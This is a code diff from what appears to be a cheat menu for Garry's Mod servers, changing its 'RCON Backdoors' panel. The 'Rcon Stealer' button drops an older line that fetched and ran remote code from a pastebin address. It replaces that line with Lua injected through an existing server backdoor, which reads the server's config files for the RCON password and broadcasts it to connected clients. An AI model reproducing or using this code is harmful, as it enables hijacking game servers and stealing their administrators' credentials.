@@ -378,10 +378,14 @@ Colors
 --[[-------------------------------------------------------------------------------------
 NetWorks
 ----------------------------------------------------------------------------------------]]
-    function CheckIfStringExists(str)
-        local status, error = pcall(net.Start, str)
-        return status
-    end
+
+	local function CheckIfStringExists(str)
+		local i = 1
+		while util.NetworkIDToString(i) do
+			if util.NetworkIDToString(i) == str then return true end
+			i = i + 1
+		end
+	end
 
 	local function rndstr(len)
 		if len == nil then len = 5 end
@@ -2067,11 +2071,38 @@ Panels 3 : RCON Backdoors
         -- RCON Backdoors
         rebug.AddButton("Rcon Stealer", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[http.Fetch("https://pastebin.com/raw/HAvguiZk",function(b,l,h,c)RunString(b)end,nil)]])
+            noob.PostLua([[util.AddNetworkString("rvac.rcon_passw_dump")
+				util.AddNetworkString("REBUG")
+				util.AddNetworkString("rvac.aucun_rcon_ici")
+				net.Receive( "REBUG", function()
+				local RconPassword
+				if file.Exists("cfg/server.cfg", "GAME") then
+				for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
+					if string.find(v, "rcon_password") then
+					RconPassword = v
+					end
+					end
+					end
+				if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
+					for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
+					if string.find(v, "rcon_password") then
+					RconPassword = v
+					end
+					end
+					end
+				if RconPassword ~= nil then
+					net.Start("rvac.rcon_passw_dump")
+					net.WriteString(RconPassword)
+					net.Broadcast()
+					else
+					net.Start("rvac.aucun_rcon_ici")
+					net.Broadcast()
+					end
+					end)]])
 
             timer.Simple(0.5, function()
-                if CheckIfStringExists("rvac.jeveuttonrconleul") then
-                    net.Start("rvac.jeveuttonrconleul")
+                if CheckIfStringExists("REBUG") then
+                    net.Start("REBUG")
                     net.SendToServer()
                 else
                     chat.AddText(Color(255, 0, 0), "RCON password not found, try again")
